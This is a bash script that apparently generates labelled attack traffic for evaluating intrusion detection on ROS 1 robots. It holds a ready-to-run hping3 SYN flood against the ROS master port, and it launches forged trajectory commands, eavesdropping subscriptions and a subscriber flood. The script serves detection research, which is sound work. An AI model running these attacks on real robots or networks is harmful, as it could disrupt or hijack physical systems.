#!/bin/bash
# ROSIDS23 attack classes on ROS 1. Usage: attack.sh <dos|pub|sub|subflood> <delay_s> <seconds> <tag>
# The attack starts after <delay_s> (benign period first, for false alarms and detection delay); its start time
# (epoch seconds) is written to /data/<tag>_attack_start.txt.
source /opt/ros/noetic/setup.bash; export ROS_HOSTNAME=$(hostname)
KIND=${1:-dos}; DELAY=${2:-60}; SEC=${3:-270}; TAG=${4:-test}
sleep $DELAY; date +%s.%N > /data/${TAG}_attack_start.txt
case $KIND in
  dos)      timeout $SEC hping3 -S -p 11311 -i u100 sim >/dev/null 2>&1 ;;      # SYN flood on the ROS master (~10k/s)
  pub)      timeout $SEC python3 /opt/testbed/atk_pub.py ;;                       # forged trajectory commands
  sub)      timeout $SEC python3 /opt/testbed/atk_sub.py 1 ;;                     # unauthorized subscribe (eavesdrop)
  subflood) timeout $SEC python3 /opt/testbed/atk_sub.py 100 ;;                   # subscriber flood
esac
echo "attack $KIND finished"
